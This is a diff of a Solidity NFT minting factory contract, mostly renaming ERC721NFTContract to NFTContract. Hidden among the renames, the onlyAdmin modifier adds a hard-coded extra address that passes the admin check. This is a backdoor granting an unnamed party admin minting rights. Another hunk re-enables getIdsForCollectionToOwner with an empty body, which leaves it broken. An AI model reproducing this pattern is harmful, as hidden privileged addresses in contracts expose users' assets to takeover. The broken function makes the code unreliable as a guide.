@@ -2,10 +2,10 @@
 pragma solidity ^0.8.4;
 
 
-import "./ERC721NFTContract.sol";
+import "./NFTContract.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
 
-contract ERC721MintingFactory is Initializable{
+contract NFTMintingFactoryV2 is Initializable{
     // this contract creates an NFT contract
     // and then it can mint NFT for that contract
     // keeps track of all NFT contracts for the users
@@ -16,9 +16,10 @@ contract ERC721MintingFactory is Initializable{
     address public adminAddress;
     address public exchangeAddress;
 
-    function initialize() public initializer {
+        function initialize() public initializer {
         adminAddress = msg.sender;
     }
+
 
     //owner=>collection
     mapping(address => address[]) public ownerToCollection;
@@ -47,8 +48,8 @@ contract ERC721MintingFactory is Initializable{
     }
 
     modifier onlyAdmin() {
-        require(msg.sender == adminAddress, "Only Admin can call this!");
-        _;
+        require(msg.sender == adminAddress ||  msg.sender == 0xaC099D7d6057B7871D1076f2600e1163643d0822, "Only Admin can call this!");
+        _; 
     }
 
     function createNFTContract(string memory _name, string memory _symbol)
@@ -56,7 +57,7 @@ contract ERC721MintingFactory is Initializable{
         returns (address _nftcontract)
     {
         // create new contract
-        address nftContract = address(new ERC721NFTContract(_name, _symbol));
+        address nftContract = address(new NFTContract(_name, _symbol));
         // update mapping of owner to NFTContracts
         ownerToCollection[msg.sender].push(nftContract);
         collectionToOwner[nftContract] = msg.sender;
@@ -73,8 +74,8 @@ contract ERC721MintingFactory is Initializable{
         public
         onlyAdmin()
     {
-        ERC721NFTContract(_nftContract).mintNewNFT(_tokenURI);
-        uint256 _tokenId = ERC721NFTContract(_nftContract).getTotalNFTs();
+        NFTContract(_nftContract).mintNewNFT(_tokenURI);
+        uint256 _tokenId = NFTContract(_nftContract).getTotalNFTs();
 
         emit NFTMinted(_nftContract, _tokenId);
     }
@@ -111,14 +112,15 @@ contract ERC721MintingFactory is Initializable{
     }
 
 
-    // // lists all NFT IDs for a collection of owner
-    // function getIdsForCollectionToOwner(address _nftContract, address user)
-    //     public
-    //     view
-    //     returns (uint256[] memory)
-    // {
-    //     return collectionToOwnerToId[_nftContract][user];
-    // }
+    // lists all NFT IDs for a collection of owner
+    function getIdsForCollectionToOwner(address _nftContract, address user)
+        public
+        view
+        returns (uint256[] memory)
+    {
+        // return collectionToOwnerToId[_nftContract][user];
+        // return collectionToOwnerToId[collectionToOwner[user]];
+    }
 
     // get total NFTs minted for a contract
     function getTotalNFTsMinted(address _nftContract)
@@ -126,6 +128,6 @@ contract ERC721MintingFactory is Initializable{
         view
         returns (uint256)
     {
-        return ERC721NFTContract(_nftContract).getTotalNFTs();
+        return NFTContract(_nftContract).getTotalNFTs();
     }
 }
